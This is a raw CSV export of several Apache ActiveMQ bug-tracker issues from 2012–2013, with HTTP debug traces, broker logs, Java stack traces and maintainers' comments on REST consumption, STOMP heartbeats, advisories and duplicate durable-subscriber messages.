TRACE <<< 415a750: 74 65 73 74 20 6d 73 67 20 73 65 6e 74 20 61 74 |test msg sent at|
TRACE <<< 415a760: 20 30 31 4a 55 4c 32 30 31 32 3a 31 38 3a 32 36 | 01JUL2012:18:26|
TRACE <<< 415a770: 3a 34 33 2e 37 30                               |:43.70          |
DEBUG Request GET returns status 200.
DEBUG Executing GET request.
DEBUG >>> GET /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=7BAB771E-AF44-4597-B603-FC018C1069B3&READTIMEOUT=1000 HTTP/1.1
DEBUG >>> Host: d22275:8161
DEBUG >>> Accept: */*
DEBUG >>> Accept-Charset: iso-8859-1,*,utf-8
DEBUG >>> Accept-Encoding: identity
DEBUG >>> Accept-Language: en
DEBUG >>> Cookie: $Version=1;JSESSIONID=171xnui5b43xz1wpgghnpgtiws;$Path=/demo
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
DEBUG <<< HTTP/1.1 204 No Content
DEBUG <<< Content-Type: text/xml;charset=UTF-8
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
DEBUG Request GET returns status 204.
DEBUG Attempting to connect to Web server 10.23.11.16:8161.
DEBUG Executing POST request.
DEBUG >>> POST /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=7BAB771E-AF44-4597-B603-FC018C1069B3&READTIMEOUT=1000&action=unsubscribe HTTP/1.1
DEBUG >>> Content-Type: application/x-www-form-urlencoded
DEBUG Cache file name used is C:\DOCUME~1\sav\LOCALS~1\Temp\SAS Temporary Files\SAS_util000100001004_d22275\ut1004000005.utl
DEBUG >>> Content-Length: 0
DEBUG >>> Host: d22275:8161
DEBUG >>> Cookie: $Version=1;JSESSIONID=171xnui5b43xz1wpgghnpgtiws;$Path=/demo
DEBUG >>> User-Agent: SAS/9
DEBUG >>> 
DEBUG <<< HTTP/1.1 200 OK
DEBUG <<< Content-Length: 0
DEBUG <<< Server: Jetty(7.6.1.v20120215)
DEBUG <<< 
DEBUG Request POST returns status 200.
DEBUG Destroying connection to Web server d22275:8161.
INFO NOTE: 2 records were read from the infile ''.
INFO       The minimum record length was 54.
INFO       The maximum record length was 54.
DEBUG Destroying connection to Web server d22275:8161.
-------------------------------------


",32-bit Windows,ggrzybek,steve.v,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3925,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253877,,,Fri Dec 20 21:00:56 UTC 2013,,,,,,,,,,,"0|i0ea6f:",81411,,,,,,,,,,,,,,,,,,,,,"05/Jul/12 20:13;steve.v;In my originating comment, I mention four things:

   1) Failure during a series of POSTs to the server over HTTP.

   2) When GETing messages off the queue just after the POST failure mentioned in item (1), my series of GETs ends prematurely due to an unexpected 204 - no content response.

   3) When my loop of GETs ends prematurely due to 204, the remaining messages still get consumed on the server side even though I specify the ""&consumer.prefetchSize=1"" parameter.

   4) My HTTP client code reports ""Web server requires that we close the current connection...""

I found the answer to item (4).  I learned that can be caused by the server sending a ""connection: close"" header.  However, that is not happening in my test case.  Instead, the http client code I am using is explicitly closing the socket and re-connecting between posts.  The person who wrote that http client code sits across the hall from me; so I will discuss item (4) with him.

     ;;;","05/Jul/12 20:39;steve.v;I changed my HTTP client code to refrain from closing the socket and re-connecting between posts and it performs better, but I still encounter the failure.  Also, in an attempt to avoid the premature 204, I increased the readTimeout to 6000000.  Here is a recent excerpt from the broker log.
--------------------------------
2012-07-05 16:32:14,002 | DEBUG | myqueue toPageIn: 200, Inflight: 636, pagedInMessages.size 646, enqueueCount: 39015, dequeueCount: 37794 | org.apache.activemq.broker.region.Queue | BrokerService[localhost] Task-29
2012-07-05 16:32:14,018 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: REDISPATCHING,initial,resumed | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-3
java.lang.IllegalStateException: REDISPATCHING,initial,resumed
	at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:403)
	at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:810)
	at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:368)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1320)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)
2012-07-05 16:32:14,018 | DEBUG | Received 0 message(s) | org.apache.activemq.web.MessageServlet | qtp1690651-31 - /demo/message/myqueue?type=queue&clientId=81D46EA5-6113-488E-9E8B-089A8C1C2CF0&readTimeout=6000000
2012-07-05 16:32:14,002 | DEBUG | default:memory:queue://myqueue:memory: usage change from: 69% of available memory, to: 68% of available memory | org.apache.activemq.usage.Usage | ActiveMQ Task-18
2012-07-05 16:32:14,018 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: REDISPATCHING,initial,resumed | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-3
java.lang.IllegalStateException: REDISPATCHING,initial,resumed
	at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:403)
	at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:810)
	at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:368)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1320)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)
--------------------------------


;;;","09/Jul/12 17:10;steve.v;Regarding item number (2), the premature 204 status can occur even when the first part(POSTing 6000 messages) succeeds.  I see the trouble encountered when POSTing messages, and the premature 204 as two separate issues.  I would not be surprised if they are both due to the same root problem; which is why I mention them both in this one jira(AMQ-3907).  If you want me to enter a separate jira for the GET--204 issue, let me know.  

Is there anything you need from me? ;;;","25/Jul/12 22:30;steve.v;   Just noticed that this jira was dup'd to AMQ3925, so I downloaded the 5.7 snapshot and it does appear to solve item (1), where I was encountering trouble when attempt to write a bunch of messages via http.  Thank you, I sincerely appreciate it.

   I am able still able to reproduce items (2) and (3), where my read loop kicks-out and the consumer gobbles up some messages.  I am able to produced it with a freshly started broker.  However, even though the first test attempt encounters the problem, subsequent attempts seem to run fine.  On the first attempt(run of my test against a just-started broker), I notice the following info message reported by the broker:

  INFO | PListStore:[C:\amq\apache-activemq-5.7-SNAPSHOT\bin\..\data\localhost\tmp_storage ] initialized

I think that has something to do with it.  If my test pgm only puts 300 messages(54 bytes of text in the body), then that storage is not needed, and my read loop does *not* kick-out prematurely.  However, if I put 3000 messages, then I encounter the above ""tmp_storage"" log msg, and my read loop kicks-out early.  Even though the URL is specify includes ""&consumer.prefetchSize=1"", I can lose a large number of messages when my read loop kicks-out.

Would you like me to open a new jira for items (2) and (3)?  Thanks in advance.
;;;","25/Jul/12 22:39;tabish;Best thing you can do to help is to create JUnit test cases that can reproduce the issues you are seeing, that way someone can look into them when they have the time. ;;;","25/Jul/12 22:49;steve.v;I am primarily a C programmer, and just an novice-intermediate Java programmer.  I can try to develop a jUnit test, but it will take some time.  Mainly because I am behind on another project and will not be able to work on a junit test for a while.  If someone could point me to an example/sample junit test that uses the RESTful HTTP protocol when communicating with the broker, that will help me get a leg-up.

My test program, written in SAS, just POSTs a bunch of messages using HTTP, then GETs them.  When I attempt to write a junit test, I will be doing the same -- post then get a bunch of messages over HTTP.;;;","29/Jul/12 17:18;steve.v;Well, I may have spoke too soon.  Even with a snapshot of 5.7.0, I sometimes still see:


2012-07-29 13:11:27,303 | DEBUG | scope null||/demo/message/myqueue @ o.e.j.w.WebAppContext{/demo,file:/C:/amq/apache-activemq-5.7-SNAPSHOT/webapps/demo/} | org.eclipse.jetty.server.handler.ContextHandler | qtp10344162-27 - /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=DBF16CAB-FBB1-4B20-A3A0-323B17F4302E&readTimeout=60000
2012-07-29 13:11:27,319 | DEBUG | context=/demo||/message/myqueue @ o.e.j.w.WebAppContext{/demo,file:/C:/amq/apache-activemq-5.7-SNAPSHOT/webapps/demo/} | org.eclipse.jetty.server.handler.ContextHandler | qtp10344162-27 - /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=DBF16CAB-FBB1-4B20-A3A0-323B17F4302E&readTimeout=60000
2012-07-29 13:11:27,319 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: DISPATCHED,initial | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-2
java.lang.IllegalStateException: DISPATCHED,initial
	at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:403)
	at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:810)
	at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:376)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1324)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)
2012-07-29 13:11:27,319 | DEBUG | Got Session ID ja7jreqwys5t1sfeqdgq872e0 from cookie | org.eclipse.jetty.server.session | qtp10344162-27 - /demo/message/myqueue?type=queue&consumer.prefetchSize=1&clientId=DBF16CAB-FBB1-4B20-A3A0-323B17F4302E&readTimeout=60000
2012-07-29 13:11:27,319 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: DISPATCHED,initial | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-2
java.lang.IllegalStateException: DISPATCHED,initial
	at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:403)
	at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:810)
	at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:376)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1324)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)
...
...snip...;;;","29/Jul/12 20:50;steve.v;I seem to be able to avoid problems if I prevent the Non-Persistent Pending Cursor from filling up.  I think I have been able to accomplish that in a number of ways:  1) Turning off Flow Control, 2) Increasing my prefetch size, and 3) Using a pending queue VMQueueCursor.  In all three of those uses cases, I do not see it initializing temporary disk storage, so I assume those configurations prevent the Non-Persistent Pending Cursor from exhausting its RAM when running my test case.  Remember my test case is put 10000 non-persistent messages and then get them back off.  I assume that test case constitutes a slow-consumer scenario.;;;","25/Nov/13 10:48;ggrzybek;I've recreated your scenario and received the same problems - 2000 POSTS works fine, then single GET dequeues all 2000 messages and then everything breaks.

The problem is resolved in 5.9.0.
See commit https://github.com/apache/activemq/commit/de49f2e8 and AMQ-4629.

regards
Grzegorz Grzybek;;;","20/Dec/13 21:00;steve.v;Thanks!  It does appear to be fixed in 5.9.0.  Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Karaf: activemq:create-broker results in only locally visible broker,AMQ-3905,12596399,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,jkindler,jkindler,29/Jun/12 13:36,03/Sep/12 09:58,14/Jul/23 05:43,03/Sep/12 09:58,5.5.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"When I start ActiveMQ with default config on console I get a broker that is visible by other machines as well as the default config uses 0.0.0.0 as publish address. Surprisingly when I embed it inside a Karaf instance the config generated from activemq:create-broker generates a broker that is only visible on my local machine.

It would be better, if both default ways would work the same: Also when starting ActiveMQ inside Karaf, it should publish the broker at 0.0.0.0 ",,davsclaus,dejanb,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/12 15:37;davsclaus;AMQ-3905.patch;https://issues.apache.org/jira/secure/attachment/12543432/AMQ-3905.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249804,,,Mon Sep 03 09:58:36 UTC 2012,,,,,,,,,,,"0|i0ahlr:",59125,,,,,,,,,,,,,,,,,,,,,"01/Sep/12 15:31;davsclaus;Patches is welcome;;;","01/Sep/12 15:33;davsclaus;Yeah I think the localhost should be 0:0:0:0 as well, so its similar to the default standalone setting.
;;;","01/Sep/12 15:38;davsclaus;@Dejan, do you see any problem with this patch? To change to use 0.0.0.0 instead of localhost;;;","03/Sep/12 09:58;dejanb;Absolutely. Patch committed with svn revision 1380187. Thanks guys.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Failed to fire fast producer advisory, reason: java.lang.NullPointerException",AMQ-3903,12596260,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,faehne,faehne,28/Jun/12 14:09,12/Jul/12 12:17,14/Jul/23 05:43,12/Jul/12 12:17,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"When sending a lot of Messages to Queue via Webconsole and advisdoryForFastProducers=""true"" (so the advisory triggers)
a exception occurs:

jvm 1    |  WARN | Failed to fire fast producer advisory, reason: java.lang.NullPointerException

2012-07-12 11:40:48,623 | DEBUG | fast producer detail | org.apache.activemq.advisory.AdvisoryBroker | VMTransport: vm://localhost#1
java.lang.NullPointerException
	at org.apache.activemq.advisory.AdvisorySupport.getFastProducerAdvisoryTopic(AdvisorySupport.java:195)
	at org.apache.activemq.advisory.AdvisoryBroker.fastProducer(AdvisoryBroker.java:352)
	at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275)
	at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275)
	at org.apache.activemq.broker.MutableBrokerFilter.fastProducer(MutableBrokerFilter.java:286)
	at org.apache.activemq.broker.region.BaseDestination.fastProducer(BaseDestination.java:512)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:605)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:189)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)",,faehne,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249717,,,Thu Jul 12 12:17:38 UTC 2012,,,,,,,,,,,"0|i0agnz:",58973,,,,,,,,,,,,,,,,,,,,,"02/Jul/12 11:16;gtully;Could you reproduce with DEBUG level logging for org.apache.activemq.advisory.AdvisoryBroker
This will produce a full stack trace for the npe in the log;;;","12/Jul/12 09:44;faehne;stack trace is appended;;;","12/Jul/12 12:17;gtully;fix in http://svn.apache.org/viewvc?rev=1360642&view=rev

note: 
 * the misspelled policy attribute advisdoryForFastProducers is now advisoryForFastProducers
 * the broker interface has changed to accommodate a new param to org.apache.activemq.broker.Broker#fastProducer;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stomp 1.1 keep alive does not work with stomp+nio,AMQ-3897,12595626,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ripienaar,ripienaar,22/Jun/12 20:18,29/Jun/12 13:25,14/Jul/23 05:43,28/Jun/12 22:25,5.6.0,,,,,5.7.0,,,Broker,STOMP,,,1,,,,,,,,,"using the transport:

{quote}
  <transportConnector name=""stomp+nio"" uri=""stomp+nio://0.0.0.0:6163""/>
{quote}

When connecting a stomp 1.1 client I see this using tcpdump (tcpdump output so new lines etc):

{quote}
send...>
CONNECT
.passcode:xxx.host:kvm4.content-length:0.heart-beat:30000,30000.content-type:text/plain; charset=UTF-8.login:rip.accept-version:1.1,1.0...
<...receive
CONNECTED.heart-beat:0,0.session:ID:kvm4-55239-1340217683781-3:10008.server:ActiveMQ/5.6.0.version:1.1....
{quote}

Notice that I send the heart-beat header requesting 30000,30000 heartbeats but then ActiveMQ replies with 0,0

If I change the stomp transport to stomp and not stomp+nio and not changing my code or what I send in CONNECT request I get the correct heartbeats.

It seems stomp+nio does not have heartbeat support for protocol 1.1","centos 6, OpenJDK 64-Bit Server VM (build 20.0-b12, mixed mode)",ripienaar,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249807,,,Fri Jun 29 13:25:39 UTC 2012,,,,,,,,,,,"0|i0ahmf:",59128,,,,,,,,,,,,,,,,,,,,,"28/Jun/12 22:25;tabish;Fixed in trunk.  ;;;","29/Jun/12 13:25;ripienaar;Thanks for sorting this out! I see it's targeted for 5.7.x, could this be 5.6.x instead? its just a bug fix and would be awesome to get this working before 5.7.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ3622Test throws NumberFormatException on ec2/ubuntu 10.04,AMQ-3896,12595604,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,22/Jun/12 16:03,22/Jun/12 18:15,14/Jul/23 05:43,22/Jun/12 18:15,5.6.0,,,,,5.7.0,,,Test Cases,,,,0,,,,,,,,,"This test throws a NumberFormatException when run on a Ubuntu 10.04 node on Amazon EC2. The test tries to get the connectionUri port by calling Integer.parseInt(connectionUri.replace(""stomp://localhost:"", """")).  

However, when run on ec2 the connectionUri actually looks something like this ""stomp://localhost.localdomain:38542"", so the replace doesn't work as intended.
",Amazon EC2 Ubuntu 10.04,kearls,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jun/12 17:47;kearls;Fix_AMQ3622_NumberFormatException.patch;https://issues.apache.org/jira/secure/attachment/12533076/Fix_AMQ3622_NumberFormatException.patch","22/Jun/12 16:04;kearls;Fix_AMQ3622_NumberFormatException.patch;https://issues.apache.org/jira/secure/attachment/12533063/Fix_AMQ3622_NumberFormatException.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249808,,,Fri Jun 22 18:15:03 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahmn:",59129,,,,,,,,,,,,,,,,,,,,,"22/Jun/12 17:45;tabish;@Kevin you need to re-upload the patch making sure to tick the ""grant license to Apache"" box on the upload dialog.  Thanks!;;;","22/Jun/12 17:48;kearls;Ok, added.  Let me know if I need to do anything else.
;;;","22/Jun/12 18:15;tabish;patch applied with thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker sends a STOMP RECEIPT frame although the subscription fails,AMQ-3895,12595594,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,22/Jun/12 15:08,20/Dec/12 16:07,14/Jul/23 05:43,22/Jun/12 15:40,5.6.0,,,,,5.7.0,,,STOMP,,,,0,,,,,,,,,"When using STOMP to subscribe to ActiveMQ using a receipt and an invalid selector or the client is not authorized, the broker replies with a RECEIPT frame giving the impression that the subscription did succeed.

Since the subscription fails, a RECEIPT frame should not be sent but instead an ERROR from with the matching receipt-id value should be returned to the client.

This was introduced in v5.6.0 as a fix for message dispatch sometimes beating the RECEIPT command back to the client.",,tabish,xbhanu,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249809,,,Fri Jun 22 15:40:26 UTC 2012,,,,,,,,,,,"0|i0ahmv:",59130,,,,,,,,,,,,,,,,,,,,,"22/Jun/12 15:40;tabish;Fix added to trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscribers receiving duplicate messages,AMQ-3891,12595438,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,eko,eko,21/Jun/12 15:05,27/Jul/12 12:45,14/Jul/23 05:43,27/Jul/12 12:45,5.5.1,5.6.0,,,,5.7.0,,,,,,,0,,,,,,,,,"This is what it seems to take to reproduce this:
•         The durable subscriber is connected to the message broker, using the failover protocol
•         The message broker is then restarted (with the client running)
•         The client application is then restarted
o   The client now receives two copies of every message!
•         Try restarting the client again
o   The client now receives three copies of every message!
•         And so on...
",,ccorsi,eko,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jul/12 08:48;eko;Duplicates.java;https://issues.apache.org/jira/secure/attachment/12537553/Duplicates.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249811,,,Fri Jul 27 12:45:16 UTC 2012,,,,,,,,,,,"0|i0ahnb:",59132,,,,,,,,,,,,,,,,,,,,,"21/Jun/12 18:12;tabish;Recommend you try and create a JUnit test case that demonstrates the issues you are seeing.;;;","21/Jun/12 19:00;ccorsi;Can you include the client uri that you used and also the transport connector definition on the broker?
;;;","21/Jun/12 21:15;eko;The client URI is ""failover:(tcp://127.0.0.1:61616?wireFormat.tcpNoDelayEnabled=true&wireFormat.tightEncodingEnabled=false&wireFormat.cacheEnabled=false)?transport.randomize=false""

And the connector is set to: 
<transportConnector name=""openwire"" uri=""nio://0.0.0.0:61616?wireFormat.tcpNoDelayEnabled=true&amp;wireFormat.tightEncodingEnabled=false&amp;wireFormat.cacheEnabled=false""/>;;;","06/Jul/12 11:17;eko;Are you able to reproduce the issue, or do you need more information? I'm using NMS/C# and not java.

We have attached wireshark to confirm that the messages was sent from the AMQ broker, and it was not a problem in NMS.;;;","06/Jul/12 12:36;tabish;NMS doesn't have the duplicate suppression features that the Java client has so its probable that this is normal behavior.  We'd need a JUnit test case that reproduces the issue to show that its not just a limitation of the NMS client at play.  ;;;","23/Jul/12 08:48;eko;Okay, I have gotten some help doing a JUnit. 

But just to be clear, this is not an issue of the client side, it's the message broker that has the problem. What we have found is that it's true that a java client using the Java api will not get the duplicated messages because the api will remove them.

What happens is if you start the JUnit attached, BEFORE the message broker is started, and then start the broker then the client will receive messages correctly.
If you then restart the JUnit, the client it self will not receive duplicates because of the Java api handling this, but if you look under connections in the admin web interface you'll see all messages is sent twice.

If you now restart the JUnit again, you'll see that all messages is dispatched 3 times, and if you restart again all messages wil be dispatched 4 times, and so on...

;;;","23/Jul/12 14:06;tabish;Recommend you test this against a 5.7-SNAPSHOT to as it might have been resolved with some other fixes that have gone in recently. ;;;","24/Jul/12 15:33;tabish;Recommend you try looking at the JUnit tests in the org.apache.activemq.bugs package and seeing if you can create something that reproduces your problem in test form, I'm not finding any issues here. ;;;","27/Jul/12 08:21;eko;The test app it self will not show an issue, you will only be able to see the issue in the admin web interface, where you can see messages beeing dispatched multible times.

Besides that this seems to be related to some of the other issues raised, so if the topic that the durable subscriber subcribs to is not configure in the config file the problem goes away.

It also do seem like the issue has been resolved in the 5.7 version, is there any info on when this version is in a stable release?

Thanks for your help, I belive that this issue can be closed now.;;;","27/Jul/12 12:45;tabish;Fixed in 5.7;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
